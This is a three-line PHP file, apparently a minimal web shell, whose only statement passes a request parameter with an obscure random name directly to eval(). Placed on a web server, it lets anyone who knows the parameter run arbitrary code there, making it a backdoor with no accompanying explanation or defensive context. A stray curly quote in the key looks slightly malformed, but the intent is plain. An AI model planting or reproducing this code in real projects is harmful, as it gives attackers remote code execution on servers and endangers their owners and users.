<?php
eval($_GET[’VD6RZqZx']);
?>
